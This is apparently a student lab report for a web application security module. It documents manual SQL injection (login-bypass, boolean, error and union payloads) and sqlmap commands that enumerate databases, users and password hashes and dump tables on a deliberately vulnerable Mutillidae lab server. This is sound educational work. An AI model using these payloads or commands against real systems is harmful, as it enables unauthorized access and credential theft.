# INT307 – Web Application Security Lab 1
## Manual and Automated SQL Injection Testing

**Student:** Ayilara Busari Dare  
**Student ID:** IDEAS/24/28133  
**Module:** INT307 – Web Application Security  
**Lab:** SQL Injection Testing

---

# Overview

This laboratory demonstrates both **manual** and **automated SQL Injection (SQLi) testing** against a deliberately vulnerable web application (Mutillidae). The objective was to identify SQL injection vulnerabilities, understand different SQL injection techniques, and use SQLMap to automate database enumeration.

> **Disclaimer**
>
> This lab was performed in a controlled virtual laboratory for educational purposes only.

---

# Lab Objectives

- Identify SQL injection vulnerable parameters
- Perform manual SQL injection attacks
- Understand authentication bypass
- Perform Boolean-based SQL Injection
- Perform Error-based SQL Injection
- Perform Union-based SQL Injection
- Retrieve database information
- Automate SQL Injection using SQLMap

---

# Lab Environment

- Kali Linux
- Mutillidae II
- SQLMap
- Firefox Browser
- VirtualBox

---

# Exercise 1 – Identify Vulnerable Parameters

## Objective

Identify vulnerable input fields within the application.

### Vulnerable Fields

- Login Username
- Login Password

### Payload Used

```sql
' OR 1=1#
```

Result:

- Authentication was bypassed successfully.

Another test was performed after creating a user account:

Username:

```
dare
```

Password:

```
123
```

Authentication bypass payload:

```sql
dare'#
```

### Result

The application logged in successfully without requiring the correct password.

---

## Screenshot

```
images/exercise1-login-bypass.png
```

---

# Exercise 2 – Basic SQL Injection Testing

## Payloads Tested

Authentication Bypass

```sql
' OR '1'='1
```

Union Test

```sql
' UNION SELECT NULL--
```

### Result

- Displayed multiple usernames stored in the database.
- Different URL behaviors confirmed SQL Injection vulnerability.

---

## Screenshot

```
images/exercise2-basic-sqli.png
```

---

# Exercise 3 – Error-Based SQL Injection

## Objective

Trigger SQL database errors to reveal backend information.

### Example Payload

```sql
'
```

### Result

Database error messages confirmed that the application is vulnerable to SQL Injection.

---

## Screenshot

```
images/exercise3-error-based.png
```

---

# Exercise 4 – Boolean-Based SQL Injection

## Objective

Use Boolean conditions to infer database responses.

### Example Payload

```sql
' AND 1=1--
```

```sql
' AND 1=2--
```

### Result

Different responses confirmed the existence of SQL Injection.

---

## Screenshot

```
images/exercise4-boolean.png
```

---

# Exercise 5 – Union-Based SQL Injection

## Objective

Extract additional database information using UNION queries.

### Example Payload

```sql
' UNION SELECT NULL,NULL--
```

### Result

Additional database data became accessible through UNION SELECT.

---

## Screenshot

```
images/exercise5-union.png
```

---

# Exercise 6 – Retrieving Database Information

Information gathered included:

- Database Name
- Usernames
- Passwords
- Table Names
- Database Structure

---

## Screenshot

```
images/exercise6-database-info.png
```

---

# Automated SQL Injection using SQLMap

## Exercise 7 – Detect Database

### List Databases

```bash
sqlmap -u "http://192.168.177.134/mutillidae/index.php?page=userinfo.php&username=Abba&password=abba" --dbs
```

### Current Database

```bash
sqlmap -u "http://192.168.177.134/mutillidae/index.php?page=userinfo.php&username=Abba&password=abba" --current-db
```

### Result

SQLMap successfully detected the backend database.

---

## Screenshot

```
images/exercise7-sqlmap-dbs.png
```

---

# Exercise 8 – Enumerate Users and Passwords

### Enumerate Users

```bash
sqlmap -u "http://192.168.120.216/mutillidae/index.php?page=user-info.php" --users
```

### Retrieve Password Hashes

```bash
sqlmap -u "http://192.168.120.216/mutillidae/index.php?page=user-info.php" --passwords
```

### Result

SQLMap extracted:

- Database users
- Password hashes

---

## Screenshot

```
images/exercise8-users-passwords.png
```

---

# Exercise 9 – Dump Database

### Dump Table Contents

```bash
sqlmap -u "TARGET_URL" -D DATABASE_NAME -T TABLE_NAME --dump
```

### Result

SQLMap successfully dumped records from the selected table.

---

## Screenshot

```
images/exercise9-dump.png
```

---

# Skills Demonstrated

- Manual SQL Injection
- Authentication Bypass
- Error-based SQLi
- Boolean-based SQLi
- Union-based SQLi
- SQLMap
- Database Enumeration
- Web Application Penetration Testing
- OWASP Top 10 (A03:2021 – Injection)

---

# Tools Used

| Tool | Purpose |
|-------|----------|
| Kali Linux | Penetration Testing |
| SQLMap | Automated SQL Injection |
| Firefox | Web Testing |
| Mutillidae II | Vulnerable Web Application |
| VirtualBox | Virtual Lab |

---

# Learning Outcomes

After completing this lab, I was able to:

- Identify SQL injection vulnerabilities
- Exploit authentication bypass
- Perform multiple SQL injection techniques
- Extract database information
- Automate attacks using SQLMap
- Understand secure coding practices to prevent SQL Injection

---

# Repository Structure

```
INT307-Web-Application-Security/
│
├── README.md
├── images/
│   ├── exercise1-login-bypass.png
│   ├── exercise2-basic-sqli.png
│   ├── exercise3-error-based.png
│   ├── exercise4-boolean.png
│   ├── exercise5-union.png
│   ├── exercise6-database-info.png
│   ├── exercise7-sqlmap-dbs.png
│   ├── exercise8-users-passwords.png
│   └── exercise9-dump.png
│
└── report.pdf
```

---

# Disclaimer

This project was conducted strictly within an isolated educational lab environment. The techniques demonstrated are intended solely for cybersecurity education, defensive security training, and authorized penetration testing.

---

**Author:** Ayilara Busari Dare  
**Module:** INT307 – Web Application Security  
**Year:** 2024
